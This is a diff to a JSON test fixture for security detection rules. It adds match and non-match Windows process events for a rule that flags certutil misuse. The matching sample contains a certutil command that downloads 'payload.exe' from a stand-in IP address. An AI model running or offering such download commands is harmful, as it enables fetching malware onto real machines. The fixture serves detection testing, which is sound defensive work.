@@ -286,5 +286,27 @@
       "command_line": "net.exe use \\\\host\\share",
       "message": "A new process has been created. New Process Name: net.exe."
     }
+  },
+  {
+    "rule_id": "SOCF-025",
+    "rule_file": "SOCF-025.yml",
+    "match": {
+      "timestamp": "2026-08-31T12:00:00Z",
+      "event_id": 4688,
+      "host": "WS-ENG-01",
+      "username": "alice",
+      "process_name": "certutil.exe",
+      "command_line": "certutil.exe -urlcache -split -f http://198.51.100.77/payload.exe out.exe",
+      "message": "A new process has been created. New Process Name: certutil.exe."
+    },
+    "non_match": {
+      "timestamp": "2026-08-31T12:00:00Z",
+      "event_id": 4688,
+      "host": "WS-ENG-01",
+      "username": "alice",
+      "process_name": "certutil.exe",
+      "command_line": "certutil.exe -hashfile file.exe SHA256",
+      "message": "A new process has been created. New Process Name: certutil.exe."
+    }
   }
 ]
